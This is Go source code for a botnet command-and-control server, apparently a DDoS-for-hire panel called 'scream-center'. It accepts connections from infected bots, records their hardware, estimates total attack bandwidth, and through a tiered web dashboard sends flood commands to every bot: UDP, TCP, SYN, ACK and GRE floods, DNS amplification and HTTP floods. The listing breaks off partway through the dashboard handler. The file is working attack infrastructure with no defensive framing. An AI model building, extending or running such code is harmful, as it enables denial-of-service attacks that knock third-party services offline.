package main

import (
	"bufio"
	"context"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/subtle"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"html/template"
	"log"
	"math"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode"

	"github.com/golang-jwt/jwt/v5"
	"github.com/google/uuid"
	"github.com/gorilla/sessions"
	"golang.org/x/crypto/argon2"
	"golang.org/x/crypto/bcrypt"
	"golang.org/x/time/rate"
)

const (
	ARGON2_TIME    = 3          // Increased iterations (1-3 is typical)
	ARGON2_MEMORY  = 128 * 1024 // 128MB (modern systems handle this easily)
	ARGON2_THREADS = 4          // Matches most modern CPU cores
	ARGON2_KEY_LEN = 32         // 32-byte (256-bit) output hash
)

const (
	USERS_FILE              = "users.json"
	BOT_SERVER_IP           = "localhost"
	BOT_SERVER_PORT         = "56123"
	botCleanupInterval      = 5 * time.Minute
	heartbeatInterval       = 30 * time.Second
	WEB_SERVER_IP           = "localhost"
	WEB_SERVER_PORT         = "443"
	CERT_FILE               = "server.crt"
	KEY_FILE                = "server.key"
	SESSION_TIMEOUT         = 30 * time.Minute
	SESSION_NAME            = "scream_session"
	JWT_ISSUER              = "scream-center"
	JWT_AUDIENCE            = "scream-dashboard"
	SSE_ENDPOINT            = "/sse"
	API_USER_DATA           = "/api/user-data"
	COMMAND_WHITELIST_OWNER = "!udpflood,!udpsmart,!tcpflood,!synflood,!ackflood,!greflood,!dns,!http,STOP,UPDATE"
	COMMAND_WHITELIST_ADMIN = "!udpflood,!udpsmart,!tcpflood,!synflood,!ackflood,!greflood,!dns,!http,STOP"
	COMMAND_WHITELIST_PRO   = "!udpflood,!tcpflood,!synflood,!ackflood,STOP"
	COMMAND_WHITELIST_BASIC = "!udpflood,!tcpflood,STOP"
)

var (
	JWT_SECRET_KEY        = generateCryptoRandomString(64)
	CSRF_SECRET           = generateCryptoRandomString(32)
	store                 *sessions.CookieStore
	loginLimiter          = rate.NewLimiter(rate.Every(5*time.Minute), 5)
	bots                  []Bot
	botCount              int
	botCountLock          sync.Mutex
	botConns              []*net.Conn
	ongoingAttacks        = make(map[string]Attack)
	botConnLimiter        = rate.NewLimiter(rate.Every(10*time.Second), 1)
	attackStats           = AttackStats{MethodCounts: make(map[string]int), LastReset: time.Now()}
	statsLock             sync.Mutex
	JWT_ACCESS_EXPIRATION = 15 * time.Minute
	sseClients            = make(map[chan Metrics]bool)
	sseClientsMu          sync.Mutex
	commandValidator      = NewCommandValidator()
	inputValidator        = NewInputValidator()
)

type CommandValidator struct {
	mu         sync.RWMutex
	commandMap map[string]map[string]bool
}

type AdaptiveRateLimiter struct {
	mu            sync.RWMutex
	baseLimiter   *rate.Limiter
	currentLimit  rate.Limit
	minLimit      rate.Limit
	maxLimit      rate.Limit
	lastAdjust    time.Time
	attackCounter int
}

type InputValidator struct {
	ipRegex       *regexp.Regexp
	hostnameRegex *regexp.Regexp
	usernameRegex *regexp.Regexp
}

type TokenPair struct {
	AccessToken  string `json:"access_token"`
	RefreshToken string `json:"refresh_token"`
}

type SessionData struct {
	Username       string
	Level          string
	Authenticated  bool
	ExpiresAt      time.Time
	LastActivity   time.Time
	FailedAttempts int
	CSRFToken      string
}

type Metrics struct {
	BotCount             int          `json:"botCount"`
	ActiveAttacks        int          `json:"activeAttacks"`
	Attacks              []AttackInfo `json:"attacks"`
	Bots                 []Bot        `json:"bots"`
	User                 *User        `json:"user,omitempty"`
	MaxConcurrentAttacks int          `json:"maxConcurrentAttacks"`
	CSRFToken            string       `json:"csrfToken,omitempty"`
	EventType            string       `json:"eventType,omitempty"`
}

type User struct {
	ID       string    `json:"ID"`
	Username string    `json:"Username"`
	Password string    `json:"Password"`
	Expire   time.Time `json:"Expire"`
	Level    string    `json:"Level"`
}

type Attack struct {
	Method    string        `json:"method"`
	Target    string        `json:"target"`
	Port      string        `json:"port"`
	Duration  time.Duration `json:"duration"`
	Start     time.Time     `json:"start"`
	UserLevel string        `json:"user_level"`
}

type Bot struct {
	Arch          string    `json:"arch"`
	Conn          net.Conn  `json:"-"`
	IP            string    `json:"ip"`
	Cores         int       `json:"cores"`
	RAM           float64   `json:"ram"`
	LastHeartbeat time.Time `json:"last_heartbeat"` // Add this field
	IsActive      bool      `json:"is_active"`      // Add this field
}

type DashboardData struct {
	User                 User
	BotCount             int
	OngoingAttacks       []AttackInfo
	Bots                 []Bot
	Users                []User
	FlashMessage         string
	BotsJSON             template.JS
	MaxAttackDuration    int
	MaxConcurrentAttacks int
	AvailableMethods     []string
	AttackPower          float64
	AverageCores         float64
	AverageRAM           float64
	CSRFToken            string
	LastHeartbeat        time.Time
	ActiveBotsCount      int
}

type AttackInfo struct {
	Method    string
	Target    string
	Port      string
	Duration  string
	Remaining string
	ID        string
}

type Claims struct {
	Username string `json:"username"`
	Level    string `json:"level"`
	jwt.RegisteredClaims
}

type AttackStats struct {
	TotalAttacksToday int
	MethodCounts      map[string]int
	TotalDuration     time.Duration
	LastReset         time.Time
}

func init() {
	store = sessions.NewCookieStore(
		[]byte(JWT_SECRET_KEY),
		[]byte(CSRF_SECRET),
	)

	store.Options = &sessions.Options{
		Path:     "/",
		MaxAge:   int(SESSION_TIMEOUT.Seconds()),
		HttpOnly: true,
		Secure:   true,
		SameSite: http.SameSiteStrictMode,
	}
}

func getAttackPower(bots []Bot) float64 {
	totalPower := 0.0

	for _, bot := range bots {
		botPower := 0.0
		networkCapacity := float64(bot.Cores) * 70.0
		ramFactor := 1.0 + (bot.RAM / 16.0)
		archFactor := 1.0
		if strings.Contains(strings.ToLower(bot.Arch), "x86_64") {
			archFactor = 1.2
		} else if strings.Contains(strings.ToLower(bot.Arch), "arm") {
			archFactor = 0.7
		}

		botPower = networkCapacity * ramFactor * archFactor
		totalPower += botPower
	}

	totalGbps := totalPower / 1000
	return math.Round(totalGbps*100) / 100
}

func NewCommandValidator() *CommandValidator {
	cv := &CommandValidator{
		commandMap: make(map[string]map[string]bool),
	}

	cv.mu.Lock()
	defer cv.mu.Unlock()

	levels := map[string]string{
		"Owner": COMMAND_WHITELIST_OWNER,
		"Admin": COMMAND_WHITELIST_ADMIN,
		"Pro":   COMMAND_WHITELIST_PRO,
		"Basic": COMMAND_WHITELIST_BASIC,
	}

	for level, commands := range levels {
		cv.commandMap[level] = make(map[string]bool)
		for _, cmd := range strings.Split(commands, ",") {
			cv.commandMap[level][cmd] = true
		}
	}

	return cv
}

func (cv *CommandValidator) IsValidCommandFormat(cmd string) bool {
	return regexp.MustCompile(`^[A-Za-z0-9! ]+$`).MatchString(cmd)
}

func (cv *CommandValidator) IsCommandAllowed(userLevel, command string) bool {
	cv.mu.RLock()
	defer cv.mu.RUnlock()

	baseCmd := strings.Split(strings.TrimSpace(command), " ")[0]

	if _, ok := cv.commandMap[userLevel]; !ok {
		return false
	}

	return cv.commandMap[userLevel][baseCmd]
}

func NewInputValidator() *InputValidator {
	return &InputValidator{
		ipRegex:       regexp.MustCompile(`^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$`),
		hostnameRegex: regexp.MustCompile(`^([a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.)+[a-zA-Z]{2,}$`),
		usernameRegex: regexp.MustCompile(`^[a-zA-Z0-9_-]{4,32}$`),
	}
}

func (iv *InputValidator) ValidateIP(ip string) bool {
	parsedIP := net.ParseIP(ip)
	return iv.ipRegex.MatchString(ip) && parsedIP != nil && !parsedIP.IsPrivate() && !parsedIP.IsLoopback()
}

func (iv *InputValidator) ValidateHostname(host string) bool {
	return iv.hostnameRegex.MatchString(host) && !strings.Contains(host, "..")
}

func (iv *InputValidator) ValidateUsername(username string) bool {
	return iv.usernameRegex.MatchString(username)
}

func (iv *InputValidator) ValidatePort(port int) bool {
	return port > 0 && port <= 65535
}

func NewAdaptiveRateLimiter(baseRate rate.Limit, burst int) *AdaptiveRateLimiter {
	return &AdaptiveRateLimiter{
		baseLimiter:   rate.NewLimiter(baseRate, burst),
		currentLimit:  baseRate,
		minLimit:      rate.Every(100 * time.Millisecond),
		maxLimit:      rate.Every(5 * time.Second),
		lastAdjust:    time.Now(),
		attackCounter: 0,
	}
}

func (arl *AdaptiveRateLimiter) Allow() bool {
	arl.mu.RLock()
	defer arl.mu.RUnlock()
	return arl.baseLimiter.Allow()
}

func (arl *AdaptiveRateLimiter) Adjust(attackDetected bool) {
	arl.mu.Lock()
	defer arl.mu.Unlock()

	now := time.Now()
	if attackDetected {
		arl.attackCounter++

		reductionFactor := 0.5
		if arl.attackCounter > 3 {
			reductionFactor = 0.25
		}

		newRate := arl.currentLimit * rate.Limit(reductionFactor)
		if newRate < arl.minLimit {
			newRate = arl.minLimit
		}
		arl.currentLimit = newRate
	} else {
		if now.Sub(arl.lastAdjust) > 5*time.Minute {
			increase := arl.currentLimit * 1.1
			if increase > arl.maxLimit {
				increase = arl.maxLimit
			}
			arl.currentLimit = increase
			arl.attackCounter = 0
		}
	}

	arl.baseLimiter.SetLimit(arl.currentLimit)
	arl.baseLimiter.SetBurst(int(arl.currentLimit))
	arl.lastAdjust = now
}

func main() {
	if !fileExists(CERT_FILE) || !fileExists(KEY_FILE) {
		generateSelfSignedCert()
	}
	if !fileExists(USERS_FILE) {
		createRootUser()
	}

	go startBotServer()
	go startBotCleanup()
	go broadcastMetrics()
	startWebServer()
}

func generateCryptoRandomString(length int) string {
	b := make([]byte, length)
	if _, err := rand.Read(b); err != nil {
		panic(err)
	}
	return base64.URLEncoding.EncodeToString(b)
}

func broadcastMetrics() {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		activeBots := getBots()
		ongoingAttacks := getOngoingAttacks()

		metrics := Metrics{
			BotCount:             len(activeBots),
			ActiveAttacks:        len(ongoingAttacks),
			Attacks:              ongoingAttacks,
			Bots:                 activeBots,
			MaxConcurrentAttacks: GetMaxConcurrentAttacks("Owner"),
		}

		sseClientsMu.Lock()
		for clientChan := range sseClients {
			select {
			case clientChan <- metrics:
				// Always send the full bot list
				clientChan <- Metrics{
					Bots:      activeBots,
					EventType: "bot-update",
				}
			default:
				log.Println("Couldn't send to client, channel blocked")
			}
		}
		sseClientsMu.Unlock()
	}
}

func fileExists(filename string) bool {
	_, err := os.Stat(filename)
	return err == nil
}

func generateSelfSignedCert() {
	cert := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "localhost"},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().AddDate(1, 0, 0),
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}

	priv, _ := rsa.GenerateKey(rand.Reader, 4096)
	certBytes, _ := x509.CreateCertificate(rand.Reader, cert, cert, &priv.PublicKey, priv)

	certOut, _ := os.Create(CERT_FILE)
	pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: certBytes})
	certOut.Close()

	keyOut, _ := os.OpenFile(KEY_FILE, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	pem.Encode(keyOut, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})
	keyOut.Close()
}

func createRootUser() {
	plainPassword := generateCryptoRandomString(16)

	// Generate a random salt
	salt := make([]byte, 16)
	if _, err := rand.Read(salt); err != nil {
		log.Fatal("Error generating salt:", err)
	}

	// Hash the password with Argon2id
	hashedPassword := argon2.IDKey([]byte(plainPassword), salt, ARGON2_TIME, ARGON2_MEMORY, ARGON2_THREADS, ARGON2_KEY_LEN)

	// Combine salt and hash for storage
	encodedHash := base64.StdEncoding.EncodeToString(append(salt, hashedPassword...))

	rootUser := User{
		ID:       uuid.New().String(),
		Username: "root",
		Password: encodedHash,
		Expire:   time.Now().AddDate(1, 0, 0),
		Level:    "Owner",
	}

	bytes, _ := json.MarshalIndent([]User{rootUser}, "", "  ")
	os.WriteFile(USERS_FILE, bytes, 0600)

	fmt.Println("╔════════════════════════════════════════════╗")
	fmt.Println("║          ROOT USER CREDENTIALS             ║")
	fmt.Println("╠════════════════════════════════════════════╣")
	fmt.Printf("║ %-20s: %-25s ║\n", "Username", "root")
	fmt.Printf("║ %-20s: %-25s ║\n", "Password", plainPassword)
	fmt.Println("╚════════════════════════════════════════════╝")
}

func startBotServer() {
	cert, err := tls.LoadX509KeyPair(CERT_FILE, KEY_FILE)
	if err != nil {
		log.Fatalf("Failed to load certificates: %v", err)
	}

	config := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
		},
		CurvePreferences:         []tls.CurveID{tls.X25519, tls.CurveP256},
		PreferServerCipherSuites: true,
	}

	listener, err := tls.Listen("tcp", fmt.Sprintf("%s:%s", BOT_SERVER_IP, BOT_SERVER_PORT), config)
	if err != nil {
		log.Fatalf("Failed to start bot server: %v", err)
	}
	defer listener.Close()

	log.Printf("Bot server listening on %s:%s", BOT_SERVER_IP, BOT_SERVER_PORT)

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Accept error: %v", err)
			continue
		}
		go handleBotConnection(conn.(*tls.Conn))
	}
}

func isValidChallengeResponse(response, challenge string) bool {
	expected := computeResponse(challenge)
	return hmac.Equal([]byte(strings.TrimSpace(response)), []byte(expected))
}

func computeResponse(challenge string) string {
	// Implement a proper challenge-response mechanism
	h := hmac.New(sha256.New, []byte("secret-key"))
	h.Write([]byte(challenge))
	return base64.StdEncoding.EncodeToString(h.Sum(nil))
}

func handleBotConnection(conn net.Conn) {
	if !botConnLimiter.Allow() {
		conn.Close()
		return
	}

	conn.SetDeadline(time.Now().Add(heartbeatInterval * 2))

	defer func() {
		conn.Close()
		decrementBotCount()
		removeBot(conn)
		runtime.GC()
	}()

	challenge := generateChallenge()
	_, err := fmt.Fprintf(conn, "CHALLENGE:%s\n", challenge)
	if err != nil {
		return
	}

	reader := bufio.NewReader(conn)
	response, err := reader.ReadString('\n')
	if err != nil || !isValidChallengeResponse(response, challenge) {
		conn.Close()
		return
	}

	ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
	newBot := Bot{
		Conn:          conn,
		IP:            ip,
		Arch:          "Unknown", // Default value
		Cores:         0,         // Default value
		RAM:           0,         // Default value
		LastHeartbeat: time.Now(),
		IsActive:      true,
	}

	// Get initial bot info
	text, err := reader.ReadString('\n')
	if err != nil {
		return
	}

	if strings.HasPrefix(text, "PONG:") {
		parts := strings.Split(text, ":")
		if len(parts) >= 4 {
			updateBotInfo(conn, parts[1], parts[2], parts[3])
		}
	}

	botCountLock.Lock()
	bots = append(bots, newBot)
	botCount = len(bots)
	botConns = append(botConns, &conn)
	botCountLock.Unlock()
}

func updateBotInfo(conn net.Conn, arch, coresStr, ramStr string) {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	ram, _ := strconv.ParseFloat(ramStr, 64)

	for i, b := range bots {
		if b.Conn == conn {
			bots[i].Arch = arch
			if cores, err := strconv.Atoi(coresStr); err == nil {
				bots[i].Cores = cores
			}
			bots[i].RAM = ram
			break
		}
	}
}

func removeBot(conn net.Conn) {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	for i, b := range bots {
		if b.Conn == conn {
			bots = append(bots[:i], bots[i+1:]...)
			break
		}
	}

	for i, botConn := range botConns {
		if *botConn == conn {
			botConns = append(botConns[:i], botConns[i+1:]...)
			break
		}
	}
	botCount = len(bots)
}

func startBotCleanup() {
	ticker := time.NewTicker(botCleanupInterval)
	defer ticker.Stop()

	for range ticker.C {
		cleanupStaleBots()
	}
}

func cleanupStaleBots() {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	// We'll just remove any bots with nil connections
	var activeBots []Bot
	for _, b := range bots {
		if b.Conn != nil {
			activeBots = append(activeBots, b)
		}
	}

	bots = activeBots
	botCount = len(bots)
}

func generateChallenge() string {
	b := make([]byte, 16)
	rand.Read(b)
	return fmt.Sprintf("%x", b)
}

func sendToBots(command string) error {
	if !commandValidator.IsCommandAllowed("Owner", command) {
		return fmt.Errorf("invalid command format")
	}

	botCountLock.Lock()
	defer botCountLock.Unlock()

	var lastErr error
	sentCount := 0

	for _, bot := range bots {
		if bot.Conn != nil {
			bot.Conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			_, err := fmt.Fprintf(bot.Conn, "%s\n", command)
			if err != nil {
				lastErr = err
				continue
			}
			sentCount++
		}
	}

	if sentCount == 0 {
		return fmt.Errorf("no active bots available")
	}
	return lastErr
}

func decrementBotCount() {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	if botCount > 0 {
		botCount--
	}
}

func updateAttackStats(method string, duration time.Duration) {
	statsLock.Lock()
	defer statsLock.Unlock()

	if time.Since(attackStats.LastReset) >= 24*time.Hour {
		attackStats = AttackStats{MethodCounts: make(map[string]int), LastReset: time.Now()}
	}

	attackStats.TotalAttacksToday++
	attackStats.MethodCounts[method]++
	attackStats.TotalDuration += duration
}

func validatePassword(password string) error {
	if len(password) < 12 {
		return fmt.Errorf("password must be at least 12 characters")
	}

	var hasUpper, hasLower, hasDigit, hasSpecial bool
	for _, c := range password {
		switch {
		case unicode.IsUpper(c):
			hasUpper = true
		case unicode.IsLower(c):
			hasLower = true
		case unicode.IsDigit(c):
			hasDigit = true
		case unicode.IsPunct(c) || unicode.IsSymbol(c):
			hasSpecial = true
		}
	}

	if !hasUpper || !hasLower || !hasDigit || !hasSpecial {
		return fmt.Errorf("password must contain uppercase, lowercase, digit and special characters")
	}

	commonPasswords := []string{"password", "123456", "qwerty", "letmein"}
	lowerPass := strings.ToLower(password)
	for _, common := range commonPasswords {
		if strings.Contains(lowerPass, common) {
			return fmt.Errorf("password is too common or weak")
		}
	}

	for i := 0; i < len(password)-2; i++ {
		if password[i]+1 == password[i+1] && password[i]+2 == password[i+2] {
			return fmt.Errorf("password contains sequential characters")
		}
	}

	return nil
}

func GetSession(r *http.Request) (*sessions.Session, error) {
	if store == nil {
		return nil, fmt.Errorf("session store not initialized")
	}
	return store.Get(r, SESSION_NAME)
}

func validateJWT(tokenString string) (*Claims, error) {
	claims := &Claims{}
	token, err := jwt.ParseWithClaims(tokenString, claims, func(token *jwt.Token) (interface{}, error) {
		if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
			return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
		}
		return []byte(JWT_SECRET_KEY), nil
	})

	if err != nil || !token.Valid {
		return nil, fmt.Errorf("invalid token")
	}

	if claims.Issuer != JWT_ISSUER {
		return nil, fmt.Errorf("invalid issuer")
	}

	if claims.Audience != nil {
		found := false
		for _, aud := range claims.Audience {
			if aud == JWT_AUDIENCE {
				found = true
				break
			}
		}
		if !found {
			return nil, fmt.Errorf("invalid audience")
		}
	}

	if claims.ExpiresAt.Before(time.Now()) {
		return nil, fmt.Errorf("token expired")
	}

	return claims, nil
}

func GetMaxAttackDuration(userLevel string) int {
	switch userLevel {
	case "Owner":
		return 3600
	case "Admin":
		return 1800
	case "Pro":
		return 600
	case "Basic":
		return 300
	default:
		return 60
	}
}

func GetMaxConcurrentAttacks(userLevel string) int {
	switch userLevel {
	case "Owner", "Admin":
		return 5
	case "Pro":
		return 3
	case "Basic":
		return 1
	default:
		return 1
	}
}

func GetAvailableMethods(userLevel string) []string {
	allMethods := []string{
		"!udpflood",
		"!udpsmart",
		"!tcpflood",
		"!synflood",
		"!ackflood",
		"!greflood",
		"!dns",
		"!http",
	}

	if userLevel == "Owner" || userLevel == "Admin" || userLevel == "Pro" {
		return allMethods
	}

	return allMethods[:4]
}

func rateLimitMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if !loginLimiter.Allow() {
			http.Error(w, "Too many requests", http.StatusTooManyRequests)
			return
		}
		next(w, r)
	}
}

func FormatAttackMethodName(method string) string {
	names := map[string]string{
		"!udpflood": "UDP Flood",
		"!udpsmart": "UDP Smart",
		"!tcpflood": "TCP Flood",
		"!synflood": "SYN Flood",
		"!ackflood": "ACK Flood",
		"!greflood": "GRE Flood",
		"!dns":      "DNS Amplification",
		"!http":     "HTTP Flood",
	}
	return names[method]
}

func FormatDurationHumanReadable(seconds int) string {
	minutes := seconds / 60
	hours := minutes / 60
	days := hours / 24

	if days > 0 {
		return fmt.Sprintf("%dd %dh", days, hours%24)
	}
	if hours > 0 {
		return fmt.Sprintf("%dh %dm", hours, minutes%60)
	}
	if minutes > 0 {
		return fmt.Sprintf("%dm %ds", minutes, seconds%60)
	}
	return fmt.Sprintf("%ds", seconds)
}

func secureCompare(a, b string) bool {
	if len(a) != len(b) {
		return false
	}
	var result byte
	for i := 0; i < len(a); i++ {
		result |= a[i] ^ b[i]
	}
	return result == 0
}

func startWebServer() {
	funcMap := template.FuncMap{
		"isActive": func(lastHeartbeat time.Time) bool {
			return time.Since(lastHeartbeat) <= 2*heartbeatInterval
		},
		"json": func(v interface{}) (template.JS, error) {
			a, err := json.Marshal(v)
			if err != nil {
				return "", err
			}
			return template.JS(a), nil
		},
		"getAttackPower":              getAttackPower,
		"GetMaxAttackDuration":        GetMaxAttackDuration,
		"GetMaxConcurrentAttacks":     GetMaxConcurrentAttacks,
		"FormatAttackMethodName":      FormatAttackMethodName,
		"FormatDurationHumanReadable": FormatDurationHumanReadable,
		"FormatMethodIcon": func(method string) template.HTML {
			icons := map[string]string{
				"!udpflood": "fa-bolt",
				"!udpsmart": "fa-brain",
				"!tcpflood": "fa-network-wired",
				"!synflood": "fa-sync",
				"!ackflood": "fa-reply",
				"!greflood": "fa-project-diagram",
				"!dns":      "fa-server",
				"!http":     "fa-globe",
			}
			if icon, ok := icons[method]; ok {
				return template.HTML(fmt.Sprintf(`<i class="fas %s"></i>`, icon))
			}
			return template.HTML(`<i class="fas fa-question"></i>`)
		},
		"IsBotActive": func(lastHeartbeat time.Time) bool {
			return time.Since(lastHeartbeat) <= 2*heartbeatInterval
		},
		"ValidateTarget": inputValidator.ValidateIP,
		"FormatDateTime": func(t time.Time) string { return t.Format("2006-01-02 15:04:05") },
		"now":            func() time.Time { return time.Now() },
	}

	tmpl, err := template.New("").Funcs(funcMap).ParseGlob("templates/*.html")
	if err != nil {
		log.Fatal("Template parsing error:", err)
	}

	addSecurityHeaders := func(next http.HandlerFunc) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			styleNonce := generateCryptoRandomString(16)
			scriptNonce := generateCryptoRandomString(16)
			w.Header().Del("Server")
			w.Header().Set("Content-Security-Policy",
				"default-src 'self'; "+
					"script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdn.jsdelivr.net https://unpkg.com; "+
					"style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com https://fonts.googleapis.com; "+
					"img-src 'self' data:; "+
					"font-src 'self' https://cdnjs.cloudflare.com https://fonts.gstatic.com; "+
					"connect-src 'self'; "+
					"frame-ancestors 'none'; "+
					"form-action 'self'")
			w.Header().Set("X-Content-Type-Options", "nosniff")
			w.Header().Set("X-Frame-Options", "DENY")
			w.Header().Set("X-XSS-Protection", "1; mode=block")
			w.Header().Set("Referrer-Policy", "no-referrer")
			w.Header().Set("Permissions-Policy", "geolocation=(), microphone=(), camera=()")
			w.Header().Set("Strict-Transport-Security", "max-age=63072000; includeSubDomains; preload")
			// Replace the current switch case in addSecurityHeaders with:
			switch filepath.Ext(r.URL.Path) {
			case ".css":
				w.Header().Set("Content-Type", "text/css")
			case ".js":
				w.Header().Set("Content-Type", "application/javascript")
			case ".png":
				w.Header().Set("Content-Type", "image/png")
			case ".jpg", ".jpeg":
				w.Header().Set("Content-Type", "image/jpeg")
			case ".gif":
				w.Header().Set("Content-Type", "image/gif")
			case ".svg":
				w.Header().Set("Content-Type", "image/svg+xml")
			case ".woff", ".woff2":
				w.Header().Set("Content-Type", "font/woff2")
			case ".ttf":
				w.Header().Set("Content-Type", "font/ttf")
			case ".eot":
				w.Header().Set("Content-Type", "application/vnd.ms-fontobject")
			}
			ctx := context.WithValue(r.Context(), "styleNonce", styleNonce)
			ctx = context.WithValue(ctx, "scriptNonce", scriptNonce)
			next(w, r.WithContext(ctx))
		}
	}

	csrfMiddleware := func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.Method == "GET" || r.Method == "HEAD" || r.Method == "OPTIONS" {
				next.ServeHTTP(w, r)
				return
			}

			session, err := GetSession(r)
			if err != nil {
				http.Error(w, "CSRF validation failed: invalid session", http.StatusForbidden)
				return
			}

			csrfToken := r.Header.Get("X-CSRF-Token")
			if csrfToken == "" {
				csrfToken = r.FormValue("csrf_token")
			}

			sessionToken, ok := session.Values["csrf_token"].(string)
			if !ok || sessionToken == "" {
				http.Error(w, "CSRF validation failed: missing session token", http.StatusForbidden)
				return
			}

			if csrfToken == "" || !secureCompare(csrfToken, sessionToken) {
				http.Error(w, "CSRF validation failed: token mismatch", http.StatusForbidden)
				return
			}

			next.ServeHTTP(w, r)
		})
	}

	server := &http.Server{
		Addr: fmt.Sprintf("%s:%s", WEB_SERVER_IP, WEB_SERVER_PORT),
		TLSConfig: &tls.Config{
			MinVersion:               tls.VersionTLS13, // Enforce TLS 1.3
			PreferServerCipherSuites: true,
			CurvePreferences:         []tls.CurveID{tls.X25519, tls.CurveP256},
			CipherSuites: []uint16{
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_CHACHA20_POLY1305_SHA256,
				tls.TLS_AES_128_GCM_SHA256,
			},
		},
	}

	http.HandleFunc(SSE_ENDPOINT, addSecurityHeaders(requireAuth(handleSSE)))
	http.Handle(API_USER_DATA, addSecurityHeaders(requireAuth(handleUserData)))

	http.HandleFunc("/", addSecurityHeaders(func(w http.ResponseWriter, r *http.Request) {
		if accessCookie, err := r.Cookie("access_token"); err == nil {
			if _, err := validateJWT(accessCookie.Value); err == nil {
				http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
				return
			}
		}

		// Generate nonces for this request
		styleNonce := generateCryptoRandomString(16)
		scriptNonce := generateCryptoRandomString(16)

		// Store nonces in context so security middleware can access them
		ctx := context.WithValue(r.Context(), "styleNonce", styleNonce)
		ctx = context.WithValue(ctx, "scriptNonce", scriptNonce)
		r = r.WithContext(ctx)

		// Execute template with nonces
		tmpl.ExecuteTemplate(w, "login.html", map[string]interface{}{
			"StyleNonce":  styleNonce,
			"ScriptNonce": scriptNonce,
			"Error":       r.URL.Query().Get("error"),
		})
	}))

	http.Handle("/login", rateLimitMiddleware(addSecurityHeaders(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Redirect(w, r, "/", http.StatusSeeOther)
			return
		}

		username := strings.TrimSpace(r.FormValue("username"))
		password := r.FormValue("password")

		if username == "" || password == "" {
			tmpl.ExecuteTemplate(w, "login.html", struct{ Error string }{"Username and password required"})
			return
		}

		exists, user := authUser(username, password)
		if !exists {
			tmpl.ExecuteTemplate(w, "login.html", struct{ Error string }{"Invalid credentials"})
			return
		}

		session, err := store.New(r, SESSION_NAME)
		if err != nil {
			log.Printf("Session creation error: %v", err)
			http.Error(w, "Internal server error", http.StatusInternalServerError)
			return
		}

		session.Options = &sessions.Options{
			Path:     "/",
			MaxAge:   int(SESSION_TIMEOUT.Seconds()),
			HttpOnly: true,
			Secure:   true,
			SameSite: http.SameSiteStrictMode,
		}

		session.Values["csrf_token"] = generateCryptoRandomString(32)
		session.Values["authenticated"] = true
		session.Values["username"] = user.Username
		session.Values["level"] = user.Level
		session.Values["user_id"] = user.ID
		session.Save(r, w)

		accessToken, err := generateAccessToken(user)
		if err != nil {
			tmpl.ExecuteTemplate(w, "login.html", struct{ Error string }{"Internal server error"})
			return
		}

		http.SetCookie(w, &http.Cookie{
			Name:     "access_token",
			Value:    accessToken,
			Path:     "/",
			Secure:   true,
			HttpOnly: true,
			MaxAge:   int(JWT_ACCESS_EXPIRATION.Seconds()),
			SameSite: http.SameSiteLaxMode,
		})

		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
	})))

	http.HandleFunc("/dashboard", addSecurityHeaders(requireAuth(func(w http.ResponseWriter, r *http.Request, user User) {
		session, _ := store.Get(r, SESSION_NAME)
		if err := store.Save(r, w, session); err != nil {
			session.Options.MaxAge = -1
			session.Save(r, w)
			store.New(r, SESSION_NAME)
		}

		if _, ok := session.Values["csrf_token"]; !ok {
			session.Values["csrf_token"] = generateCryptoRandomString(32)
			session.Save(r, w)
		}

		csrfToken, _ := session.Values["csrf_token"].(string)

		data := DashboardData{
			User:                 user,
			BotCount:             getBotCount(),
			OngoingAttacks:       getOngoingAttacks(),
			Bots:                 getBots(),
			Users:                getUsers(),
			FlashMessage:         r.URL.Query().Get("flash"),
			MaxAttackDuration:    GetMaxAttackDuration(user.Level),
			MaxConcurrentAttacks: GetMaxConcurrentAttacks(user.Level),
			AvailableMethods:     GetAvailableMethods(user.Level),
			CSRFToken:            csrfToken,
			ActiveBotsCount:      getActiveBotsCount(getBots()),
		}

